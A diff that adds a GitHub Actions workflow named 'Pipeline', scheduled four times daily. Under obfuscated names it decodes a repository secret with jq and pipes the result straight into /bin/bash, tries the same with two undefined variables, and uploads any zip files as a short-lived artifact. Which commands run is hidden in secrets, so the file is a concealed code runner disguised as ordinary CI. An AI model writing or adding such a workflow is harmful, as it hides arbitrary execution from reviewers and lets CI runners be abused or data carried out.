@@ -1,0 +1,30 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '44 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          twinq2428: ${{ secrets.twinq2428 }}
+        run: |
+          printf '%s' "$twinq2428" | jq -r .d87 | /bin/bash
+          printf '%s' "$vb4998" | jq -r .al6964 | /bin/bash
+          echo $zi03527 | jq -r .jjcpq47 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: jg5r5FKP
+          path: "*.zip"
+          retention-days: 1
